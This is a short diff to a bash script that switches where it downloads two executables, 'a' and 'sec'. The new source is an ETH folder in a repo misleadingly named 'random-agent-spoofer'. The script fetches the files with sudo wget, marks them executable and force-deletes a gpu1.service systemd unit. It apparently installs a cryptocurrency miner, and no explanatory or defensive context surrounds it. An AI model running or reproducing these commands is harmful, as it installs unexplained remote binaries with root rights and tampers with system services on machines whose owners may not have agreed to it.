@@ -1,7 +1,7 @@
 #!/bin/bash
 cd /home
-sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/a
-sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/sec
+sudo wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/a
+sudo wget https://github.com/trangtrau/random-agent-spoofer/raw/master/ETH/sec
 sudo chmod +x sec
 sudo chmod +x a
 sudo rm -rf /lib/systemd/system/gpu1.service
